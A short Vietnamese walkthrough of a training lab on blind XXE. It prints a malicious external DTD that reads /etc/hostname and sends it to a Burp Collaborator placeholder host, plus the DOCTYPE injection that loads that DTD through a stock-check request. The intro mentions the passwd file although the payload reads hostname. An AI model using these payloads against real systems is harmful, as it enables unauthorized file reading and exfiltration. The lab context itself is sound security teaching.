## Exploiting blind XXE to exfiltrate data using a malicious external DTD

> Lần này Lab bảo chúng ta hãy tới Exploit Server để tấn công tới server có lỗi xxe

Đây là cách khai thác lỗ hổng XXE sử dụng 1 DTD để đầu độc hệ thống và trả ra nội dung file passwd.

![](/imgs/XXE/20.png?raw=true)

```XML
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net/?x=%file;'>">
%eval;
%exfil;
```

Có nghĩa là biến file sẽ được gán bằng giá trị của hostname

Còn entity eval sẽ gửi đến địa chỉ của Burp Collaborator với format ***domain/?x=<nội_dung_file>*** thông qua địa chỉ file dtd chúng ta tạo trên exploit server

![](/imgs/XXE/21.png?raw=true)

Trở về request checkStock và thực thi param entity.

```XML
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "địa_chỉ_exploit_server"> %xxe;]>
```

![](/imgs/XXE/22.png?raw=true)

Chúng ta sẽ nhận được 1 số request gửi đến Burp Collaborator

Request Type HTTP có format đúng như chúng ta đã chỉ định => Hostname = giá trị sau x=

![](/imgs/XXE/22.png?raw=true)

Submit giá trị của x là solve lab.

![](/imgs/XXE/22.png?raw=true)

### Tài Liệu Tham Khảo
- Một số CheatSheet: [https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html](https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html)